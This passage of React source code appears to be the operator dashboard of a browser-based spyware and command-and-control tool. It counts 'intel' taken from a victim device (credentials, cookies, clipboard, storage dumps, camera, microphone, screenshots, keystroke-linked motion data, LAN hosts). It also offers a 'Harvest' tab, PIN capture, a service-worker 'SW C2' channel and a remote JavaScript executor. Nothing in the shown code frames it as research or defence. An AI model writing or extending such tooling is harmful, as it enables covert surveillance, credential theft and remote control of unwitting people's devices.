      motion:    events.filter(e => ['motion','compass','motion_capture','motion_stream','motion_activity','motion_gait','motion_context','motion_tremor','motion_taps','motion_tap_detected','motion_keystroke_event','motion_keystrokes','motion_elevator','motion_photo','motion_dead_reckoning','motion_profile','motion_session_started','motion_session_live','motion_session_summary'].includes(e.type)).length,
      creds:     events.filter(e => e.type === 'credentials').length,
      shots:     screenshots.length,
      camera:    cameraFrames.length,
      video:     (videos ?? []).length,
      audio:     (recordings ?? []).length,
      speech:    events.filter(e => e.type === 'speech_result').length,
      cookies:   events.filter(e => e.type === 'cookies').length,
      storage:   events.filter(e => e.type === 'storage_dump').length,
      gpu:       events.filter(e => e.type === 'gpu').length,
      lan:       events.filter(e => e.type === 'lan_hosts').length,
      dns:       events.filter(e => e.type === 'dns_results').length,
      tabs:      events.filter(e => e.type === 'tab_snapshot' || e.type === 'tab_update').length,
      swlog:     events.filter(e => e.type === 'sw_intercept_log').length,
    };
    if (!prevCountsRef.current) { prevCountsRef.current = cur; return; }
    const prev = prevCountsRef.current;
    const arrivals = [];
    if (cur.geo       > prev.geo)       arrivals.push({ icon: '📍', label: 'Location',    count: cur.geo       - prev.geo });
    if (cur.clipboard > prev.clipboard) arrivals.push({ icon: '📋', label: 'Clipboard',   count: cur.clipboard - prev.clipboard });
    if (cur.filesystem  > prev.filesystem)  arrivals.push({ icon: '📁', label: 'Files',     count: cur.filesystem  - prev.filesystem });
    if (cur.motion    > prev.motion)    arrivals.push({ icon: '📐', label: 'Motion',      count: cur.motion    - prev.motion });
    if (cur.creds     > prev.creds)     arrivals.push({ icon: '🔑', label: 'Credentials', count: cur.creds     - prev.creds });
    if (cur.shots     > prev.shots)     arrivals.push({ icon: '🖼', label: 'Screenshot',  count: cur.shots     - prev.shots });
    if (cur.camera    > prev.camera)    arrivals.push({ icon: '📷', label: 'Camera',      count: cur.camera    - prev.camera });
    if (cur.video     > prev.video)     arrivals.push({ icon: '🎬', label: 'Video',       count: cur.video     - prev.video });
    if (cur.audio     > prev.audio)     arrivals.push({ icon: '🎙️', label: 'Recording',   count: cur.audio     - prev.audio });
    if (cur.cookies   > prev.cookies)   arrivals.push({ icon: '🍪', label: 'Cookies',     count: cur.cookies   - prev.cookies });
    if (cur.storage   > prev.storage)   arrivals.push({ icon: '💾', label: 'Storage',     count: cur.storage   - prev.storage });
    if (cur.gpu       > prev.gpu)       arrivals.push({ icon: '🎮', label: 'GPU',         count: cur.gpu       - prev.gpu });
    if (cur.lan       > prev.lan)       arrivals.push({ icon: '🌐', label: 'LAN Hosts',   count: cur.lan       - prev.lan });
    if (cur.dns       > prev.dns)       arrivals.push({ icon: '🔎', label: 'DNS Oracle',  count: cur.dns       - prev.dns });
    if (cur.tabs      > prev.tabs)      arrivals.push({ icon: '📑', label: 'Tabs',        count: cur.tabs      - prev.tabs });
    if (cur.swlog     > prev.swlog)     arrivals.push({ icon: '🕸️', label: 'SW Requests', count: cur.swlog     - prev.swlog });
    prevCountsRef.current = cur;
    if (arrivals.length > 0) {
      clearTimeout(toastTimerRef.current);
      setIntelToast(arrivals);
      toastTimerRef.current = setTimeout(() => setIntelToast(null), 5000);
    }
  }, [events, screenshots, cameraFrames, videos, recordings, loading]);

  async function handleSoftRefresh() {
    setReloadDone(false);
    try {
      await sendCommand(id, 'soft_refresh');
      setReloadSentAt(Date.now());
    } catch (err) {
      alert(`Refresh failed: ${err.message}`);
    }
  }

  async function handleHardReload() {
    const ok = window.confirm('Force reload will disconnect audio and requires a user tap to restore.\n\nContinue?');
    if (!ok) return;
    setReloadDone(false);
    try {
      await sendCommand(id, 'reload');
      setReloadSentAt(Date.now());
    } catch (err) {
      alert(`Reload failed: ${err.message}`);
    }
  }

  async function saveName() {
    setEditingName(false);
    const trimmed = nameInput.trim();
    if (trimmed && trimmed !== device.name) {
      try { await updateDevice(id, { name: trimmed }); await load(); } catch { /* ignore */ }
    }
  }

  async function handleClearEvents() {
    if (!window.confirm('Clear all events for this device?')) return;
    setClearingEvents(true);
    try {
      await apiFetch(`/api/devices/${id}/events`, { method: 'DELETE' });
      await load();
    } catch (err) {
      alert(`Clear failed: ${err.message}`);
    } finally {
      setClearingEvents(false);
    }
  }

  async function handleDelete() {
    const name = device?.name || `#${id}`;
    if (!window.confirm(`Delete device ${name}?`)) return;
    setDeleting(true);
    try {
      await deleteDevice(id);
      navigate('/devices');
    } catch (err) {
      alert(`Delete failed: ${err.message}`);
      setDeleting(false);
    }
  }

  if (loading || !device) return (
    <div style={{ padding: 40, color: '#4e5a70', textAlign: 'center' }}>Loading...</div>
  );

  return (
    <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }}>
      {/* Intel arrival toast */}
      <AnimatePresence>
        {intelToast && (
          <motion.div
            key="intel-toast"
            initial={{ opacity: 0, y: -16, scale: 0.96 }}
            animate={{ opacity: 1, y: 0,   scale: 1 }}
            exit={{    opacity: 0, y: -16, scale: 0.96 }}
            transition={{ duration: 0.25 }}
            style={{
              position: 'fixed', top: 68, right: 20, zIndex: 9000,
              background: '#141728', border: '1px solid #30d15855',
              borderRadius: 14, padding: '10px 16px',
              display: 'flex', gap: 12, alignItems: 'center',
              boxShadow: '0 4px 32px rgba(0,0,0,0.6), 0 0 0 1px #30d15822',
              cursor: 'pointer',
            }}
            onClick={() => setIntelToast(null)}
          >
            <span style={{ fontSize: 22, lineHeight: 1 }}>📥</span>
            <div>
              <div style={{ fontSize: 11, fontWeight: 700, color: '#22c55e', marginBottom: 4, letterSpacing: '0.05em', textTransform: 'uppercase' }}>New Intel</div>
              <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
                {intelToast.map((a, i) => (
                  <span key={i} style={{ fontSize: 13 }}>
                    {a.icon} <span style={{ color: '#c9d1e8', fontWeight: 600 }}>{a.label}</span>
                    {a.count > 1 && <span style={{ color: '#4e5a70', fontSize: 11 }}> ×{a.count}</span>}
                  </span>
                ))}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
      {/* Header */}
      <div style={{ borderBottom: '1px solid rgba(255,255,255,0.09)', paddingBottom: 20, marginBottom: 20 }}>
      <div style={{ display: 'flex', alignItems: 'flex-start', gap: 20, marginBottom: 0 }}>
        <button onClick={() => navigate('/devices')} style={{
          padding: '0 10px', height: 28, borderRadius: 5, border: '1px solid rgba(255,255,255,0.09)',
          background: 'transparent', color: '#c9d1e8', fontSize: 12, fontWeight: 600, cursor: 'pointer',
        }}>Back</button>
        <button onClick={handleSoftRefresh}
          disabled={!!reloadSentAt && !reloadDone}
          title="Re-sync permissions & state - audio stays connected"
          style={{
            background: reloadDone ? 'rgba(34,197,94,0.09)' : reloadSentAt ? 'rgba(245,158,11,0.09)' : 'rgba(59,130,246,0.09)',
            border: `1px solid ${reloadDone ? 'rgba(34,197,94,0.3)' : reloadSentAt ? 'rgba(245,158,11,0.3)' : 'rgba(59,130,246,0.3)'}`,
            color: reloadDone ? '#22c55e' : reloadSentAt ? '#f59e0b' : '#3b82f6',
            padding: '0 10px', height: 28, borderRadius: 5, cursor: 'pointer', fontSize: 12, fontWeight: 600,
          }}>
          {reloadDone ? '✓ Synced' : reloadSentAt ? '⏳ Waiting...' : 'Sync'}
        </button>
        <button onClick={handleHardReload}
          disabled={!!reloadSentAt && !reloadDone}
          title="Full page reload - disconnects audio"
          style={{
            background: 'rgba(245,158,11,0.09)', border: '1px solid rgba(245,158,11,0.3)', color: '#f59e0b',
            padding: '0 10px', height: 28, borderRadius: 5, cursor: 'pointer', fontSize: 12, fontWeight: 600,
            opacity: (!!reloadSentAt && !reloadDone) ? 0.5 : 1,
          }}>
          Reload
        </button>
        <button onClick={handleDelete} disabled={deleting} style={{
          background: 'rgba(239,68,68,0.09)', border: '1px solid rgba(239,68,68,0.3)', color: '#ef4444',
          padding: '0 10px', height: 28, borderRadius: 5, cursor: 'pointer', fontSize: 12,
          fontWeight: 600, opacity: deleting ? 0.5 : 1,
        }}>{deleting ? 'Deleting...' : 'Delete Device'}</button>
        <div style={{ flex: 1 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            {editingName ? (
              <input
                autoFocus
                value={nameInput}
                onChange={e => setNameInput(e.target.value)}
                onBlur={saveName}
                onKeyDown={e => { if (e.key === 'Enter') saveName(); if (e.key === 'Escape') setEditingName(false); }}
                style={{
                  fontSize: 18, fontWeight: 700, background: '#141728', color: '#c9d1e8',
                  border: '1px solid #3b82f6', borderRadius: 8, padding: '2px 10px', outline: 'none',
                }}
              />
            ) : (
              <h1
                title="Click to edit"
                onClick={() => { setEditingName(true); setNameInput(device.name || ''); }}
                style={{ margin: 0, fontSize: 18, fontWeight: 700, color: '#c9d1e8', cursor: 'text', borderBottom: '1px dashed rgba(255,255,255,0.12)' }}
              >{device.name || `Device #${id}`}</h1>
            )}
            <StatusBadge status={deviceStatus(device.last_seen)} />
            {audioUnlocked && deviceStatus(device.last_seen) === 'online' && (() => {
              const isFg = appVisible;
              return (
                <>
                  <style>{`
                    @keyframes _fgPulse {
                      0%,100% { box-shadow: 0 0 0 0 #30d15866; }
                      50%     { box-shadow: 0 0 0 5px #30d15800; }
                    }
                    @keyframes _bgPulse {
                      0%,100% { box-shadow: 0 0 0 0 rgba(167,139,250,0.40); }
                      50%     { box-shadow: 0 0 0 4px #5e5ce600; }
                    }
                    @keyframes _dotBlink {
                      0%,100% { opacity: 1; }
                      50%     { opacity: 0.3; }
                    }
                  `}</style>
                  <span style={{
                    display: 'inline-flex', flexDirection: 'column', alignItems: 'flex-start', gap: 1,
                    fontSize: 11, fontWeight: 600, padding: '4px 10px', borderRadius: 8,
                    background: isFg ? 'rgba(34,197,94,0.09)' : 'rgba(167,139,250,0.09)',
                    border: `1px solid ${isFg ? 'rgba(34,197,94,0.27)' : 'rgba(167,139,250,0.27)'}`,
                    color: isFg ? '#22c55e' : '#a78bfa',
                    animation: isFg ? '_fgPulse 1.4s ease-in-out infinite' : '_bgPulse 2.4s ease-in-out infinite',
                  }}>
                    <span style={{ display: 'flex', alignItems: 'center', gap: 5 }}>
                      <span style={{ width: 6, height: 6, borderRadius: '50%', display: 'inline-block',
                        background: isFg ? '#22c55e' : '#a78bfa',
                        animation: '_dotBlink ' + (isFg ? '1.4s' : '2.4s') + ' ease-in-out infinite',
                        flexShrink: 0,
                      }} />
                      {isFg ? 'Active' : 'Running in background'}
                    </span>
                    {isFg ? (
                      <span style={{ fontSize: 9, fontWeight: 400, color: '#30d158aa', marginLeft: 11 }}>
                        can run in background
                      </span>
                    ) : (
                      <span style={{ fontSize: 9, fontWeight: 500, color: '#5e5ce6aa', marginLeft: 11 }}>
                        Activity limited
                      </span>
                    )}
                  </span>
                </>
              );
            })()}
          </div>
          <div style={{ fontFamily: 'ui-monospace,monospace', fontSize: 11, color: '#4e5a70', marginTop: 6, display: 'flex', gap: 20, flexWrap: 'wrap' }}>
            <span>ID: {id}</span>
            <span>Last Seen: {device.last_seen ? parseUTC(device.last_seen).toLocaleString('en-IL', { timeZone: 'Asia/Jerusalem' }) : '-'}</span>
          </div>
        </div>
      </div>
      </div>

      {/* Tabs */}
      <div style={{ display: 'flex', borderBottom: '1px solid rgba(255,255,255,0.09)', marginBottom: 20, gap: 0 }}>
        {TABS.map((t, i) => (
          <button key={t} onClick={() => { setTab(i); sessionStorage.setItem(`wc_tab_${id}`, i); }} style={{
            padding: '0 14px', height: 36, fontSize: 12, fontWeight: 600, cursor: 'pointer',
            background: 'transparent', border: 'none',
            borderBottom: tab === i ? '2px solid #3b82f6' : '2px solid transparent',
            color: tab === i ? '#c9d1e8' : '#4e5a70',
            transition: 'color 0.12s, border-color 0.12s', whiteSpace: 'nowrap',
          }}>
            {t}
          </button>
        ))}
      </div>

      {/* 0: Collected Information */}
      {tab === 0 && <CollectedInfo device={device} events={events} />}

      {/* 1: Permissions */}
      {tab === 1 && <PermissionsPanel events={events} deviceId={id} onSent={load} onFastPoll={startFastPoll} device={device} />}

      {/* 2: Harvest */}
      {tab === 2 && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
          <CollapsibleSection label="🔍 Network Recon" storageKey="recon">
            <ReconPanel deviceId={id} events={events} device={device} onSent={load} deviceIp={(() => { try { const r = JSON.parse(device.ip_history_json || '[]'); return (Array.isArray(r) ? r : []).map(e => typeof e === 'object' ? e.ip : e).filter(Boolean)[0] || null; } catch { return null; } })()} onToast={(msg) => { if (toastTimerRef.current) clearTimeout(toastTimerRef.current); setIntelToast([{ icon: '🎯', label: msg }]); toastTimerRef.current = setTimeout(() => setIntelToast(null), 8000); }} />
          </CollapsibleSection>

          <CollapsibleSection label="🎯 Commands" storageKey="cmd">
            <CommandPanel
              deviceId={id}
              onSent={load}
              shotSentAt={shotSentAt}
              shotDone={shotDone}
              onShotSent={() => { setShotDone(false); setShotSentAt(Date.now()); }}
            />
          </CollapsibleSection>

          <PinCaptureSection deviceId={id} creds={creds} onSent={load} />
          <StudioTemplateSection deviceId={id} onSent={load} />

          {(() => {
            const _p = parseEvent(events?.find(e => e.type === 'permissions')) ?? {};
            const notifGranted   = _p.notifications === 'granted';
            const motionGranted  = _p.motion === 'granted';
            const cameraGranted  = _p.camera === 'granted';
            const micGranted     = _p.microphone === 'granted';
            const geoGranted     = _p.geolocation === 'granted' || _p.geolocation === 'indeterminate';
            return (<>
              <CollapsibleSection label="📸 Camera" storageKey="cameraharvest"
                locked={!cameraGranted} lockMsg="Camera not granted - request in Permissions tab">
                <CameraHarvestSection deviceId={id} onSent={load} />
              </CollapsibleSection>

              <CollapsibleSection label="🎤 Microphone" storageKey="micharvest"
                locked={!micGranted} lockMsg="Microphone not granted - request in Permissions tab">
                <MicHarvestSection deviceId={id} onSent={load} />
              </CollapsibleSection>

              <CollapsibleSection label="📍 Geolocation" storageKey="geoharvest"
                locked={!geoGranted} lockMsg="Geolocation not granted - request in Permissions tab">
                <GeoHarvestSection deviceId={id} onSent={load} />
              </CollapsibleSection>

              <CollapsibleSection label="📋 Clipboard" storageKey="clipboardharvest">
                <ClipboardHarvestSection deviceId={id} onSent={load} />
              </CollapsibleSection>

              <CollapsibleSection label="Push Notification" storageKey="pushnotify"
                locked={!notifGranted} lockMsg="Notifications not granted - request in Permissions tab">
                <PushNotifySection deviceId={id} />
              </CollapsibleSection>

              <CollapsibleSection label="Motion + Compass" storageKey="motionharvest"
                locked={!motionGranted} lockMsg="Motion not granted - request in Permissions tab">
                <MotionHarvestSection deviceId={id} onSent={load} />
              </CollapsibleSection>

              <CollapsibleSection label="📁 OPFS - On-Device Storage" storageKey="opfsharvest">
                <OpfsHarvestSection deviceId={id} />
              </CollapsibleSection>
            </>);
          })()}

          <CollapsibleSection label="📋 Command History" storageKey="hist">
            <div style={{ padding: '12px 14px' }}>
              <div style={{ display: 'flex', justifyContent: 'flex-end', marginBottom: 10 }}>
                {commands.length > 0 && (
                  <button
                    onClick={async () => {
                      try {
                        await apiFetch(`/api/devices/${id}/commands`, { method: 'DELETE' });
                        await load();
                      } catch (err) { alert(`Failed: ${err.message}`); }
                    }}
                    style={{ background: 'rgba(239,68,68,0.13)', border: '1px solid rgba(239,68,68,0.27)', color: '#ef4444', padding: '4px 10px', borderRadius: 6, fontSize: 11, fontWeight: 600, cursor: 'pointer' }}
                  >Clear</button>
                )}
              </div>
              {commands.length === 0 ? (
                <div style={{ color: '#4e5a70', fontSize: 13 }}>No commands yet</div>
              ) : (() => {
                const grouped = commands.reduce((acc, c) => {
                  const key = c.type ?? 'unknown';
                  if (!acc[key]) acc[key] = [];
                  acc[key].push(c);
                  return acc;
                }, {});
                return Object.entries(grouped).map(([type, cmds]) => (
                  <CmdGroup key={type} type={type} cmds={cmds} />
                ));
              })()}
            </div>
          </CollapsibleSection>

          {screenshots.length > 0 && (
            <CollapsibleSection label={`📸 Screenshots (${screenshots.length})`} storageKey="shots">
              <div style={{ padding: '12px 14px', display: 'flex', flexWrap: 'wrap', gap: 12 }}>
                {screenshots.map(s => (
                  <div key={s.id} style={{ position: 'relative' }}>
                    <div onClick={() => setLightbox(s.url)} style={{ cursor: 'zoom-in' }}>
                      <AuthedImage
                        url={s.url}
                        style={{ width: 120, height: 200, objectFit: 'cover', borderRadius: 10, border: '1px solid #2c2c2e', display: 'block' }}
                      />
                    </div>
                    <button
                      onClick={async () => {
                        try {
                          await apiFetch(`/api/devices/${id}/screenshots/${s.id}`, { method: 'DELETE' });
                          await load();
                        } catch (err) { alert(`Failed: ${err.message}`); }
                      }}
                      style={{ position: 'absolute', top: 4, right: 4, background: 'rgba(239,68,68,0.80)', border: 'none', color: '#c9d1e8', borderRadius: 6, width: 22, height: 22, fontSize: 12, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', lineHeight: 1 }}
                      title="Delete"
                    >✕</button>
                    <div style={{ fontSize: 10, color: '#4e5a70', marginTop: 4, textAlign: 'center' }}>
                      {parseUTC(s.timestamp).toLocaleTimeString('en-IL', { timeZone: 'Asia/Jerusalem' })}
                    </div>
                  </div>
                ))}
              </div>
            </CollapsibleSection>
          )}

        </div>
      )}

      {/* 3: Intelligence - grouped by type */}
      {tab === 3 && (
        <IntelligenceTab
          events={events}
          screenshots={screenshots}
          cameraFrames={cameraFrames}
          videos={videos}
          recordings={recordings}
          creds={creds}
          deviceId={id}
          setLightbox={setLightbox}
          onLoad={load}
        />
      )}

      {/* 4: Insights - attacker-perspective intelligence */}
      {tab === 4 && (
        <InsightsPanel
          device={device}
          events={events}
          screenshots={screenshots}
          cameraFrames={cameraFrames}
          creds={creds}
        />
      )}

      {/* 5: Events */}
      {tab === 5 && (
        <div>
          <div style={{ display: 'flex', justifyContent: 'flex-end', padding: '0 0 12px 0' }}>
            <button onClick={handleClearEvents} disabled={clearingEvents} style={{
              background: 'rgba(245,158,11,0.09)', border: '1px solid rgba(245,158,11,0.27)', color: '#f59e0b',
              padding: '6px 14px', borderRadius: 8, cursor: 'pointer', fontSize: 13,
              fontWeight: 600, opacity: clearingEvents ? 0.5 : 1,
            }}>{clearingEvents ? 'Clearing…' : '🗑 Clear Events'}</button>
          </div>
          <EventFeed events={events} />
        </div>
      )}

      {/* 6: Console */}
      {tab === 6 && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
          {/* SW C2 */}
          <CollapsibleSection
            label="📡 SW C2"
            storageKey="swc2"
            locked={!device?.push_subscription}
            lockMsg="No push subscription - device must grant notification permission first."
          >
            <SwC2Section deviceId={id} />
          </CollapsibleSection>
          {/* JS Executor */}
          <div style={{ background: '#07080f', borderRadius: 10, border: '1px solid #1c1c1e', overflow: 'hidden' }}>
            <div style={{
              padding: '9px 14px', borderBottom: '1px solid #1c1c1e',
              display: 'flex', justifyContent: 'space-between', alignItems: 'center',
            }}>
              <span style={{ fontSize: 11, color: '#4e5a70', fontWeight: 700, letterSpacing: '0.08em', textTransform: 'uppercase' }}>JS Executor</span>
              <span style={{ fontSize: 11, color: 'rgba(255,255,255,0.09)' }}>Ctrl+Enter to run</span>
            </div>
            <JSExecutor deviceId={id} events={events} onSent={load} onFastPoll={startFastPoll} />
          </div>
          {/* Console output */}
          <div style={{ background: '#07080f', borderRadius: 10, border: '1px solid #1c1c1e', overflow: 'hidden' }}>
            <div style={{
              padding: '9px 14px', borderBottom: '1px solid #1c1c1e',
              display: 'flex', justifyContent: 'space-between', alignItems: 'center',
            }}>
              <span style={{ fontSize: 11, color: '#4e5a70', fontWeight: 700, letterSpacing: '0.08em', textTransform: 'uppercase' }}>Device Console</span>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                <span style={{ fontSize: 11, color: 'rgba(255,255,255,0.09)' }}>{events.filter(e => e.type === 'console_log').length} entries</span>
                <button onClick={async () => {
                  await apiFetch(`/api/devices/${id}/events?type=console_log`, { method: 'DELETE' });
                  load();
                }} style={{ padding: '2px 10px', borderRadius: 6, border: 'none', fontSize: 11, background: 'rgba(255,255,255,0.09)', color: '#4e5a70', cursor: 'pointer' }}>Clear</button>
              </div>
            </div>
            <ConsolePanel events={events} />
          </div>
        </div>
      )}

      {/* Lightbox */}
      {lightbox && (
        <div
          onClick={() => setLightbox(null)}
          style={{
            position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.92)',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            zIndex: 9999, cursor: 'zoom-out',
          }}
        >
          <button
            onClick={() => setLightbox(null)}
            style={{
              position: 'absolute', top: 20, right: 24, background: 'none',
              border: 'none', color: '#c9d1e8', fontSize: 28, cursor: 'pointer', lineHeight: 1,
            }}
          >✕</button>
          <AuthedImage
            url={lightbox}
            style={{ maxWidth: '90vw', maxHeight: '90vh', borderRadius: 12, objectFit: 'contain', display: 'block' }}
          />
        </div>
      )}
    </motion.div>
  );
}
